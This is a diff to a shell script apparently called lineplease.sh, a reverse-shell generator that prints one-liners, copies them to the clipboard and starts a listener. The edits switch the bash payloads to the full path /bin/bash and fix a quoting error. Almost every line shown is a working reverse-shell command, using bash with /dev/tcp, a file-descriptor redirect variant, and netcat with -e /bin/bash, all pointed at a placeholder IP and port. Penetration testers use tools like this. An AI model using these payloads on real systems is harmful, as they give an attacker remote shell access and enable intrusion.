@@ -153,9 +153,9 @@ example:	./lineplease.sh -h | grep bash
 options:
 
 bash:
--b      	bash -i >& /dev/tcp/[ip]/[port] 0>&1
+-b      	/bin/bash -i >& /dev/tcp/[ip]/[port] 0>&1
 -be		0<&196;exec 196<>/dev/tcp/[ip]/[port]; sh <&196 >&196 2>&196
--bc     	bash -c 'bash -i >& /dev/tcp/[ip]/[port] 0>&1'
+-bc     	/bin/bash -c 'bash -i >& /dev/tcp/[ip]/[port] 0>&1'
 
 netcat:
 -n      	nc -e /bin/bash [ip] [port]
@@ -301,12 +301,12 @@ then
 
 case  "$1" in
 
--b) LINE="bash -i >& /dev/tcp/$IP/$PORT 0>&1"
+-b) LINE="/bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1"
 printf "\n$LINE\n\n"
 copy_line "$LINE"
 start_listener "$PORT"
 ;;
--bc) LINE="bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1"
+-bc) LINE="/bin/bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'"
 printf "\n$LINE\n\n"
 copy_line "$LINE"
 start_listener "$PORT"
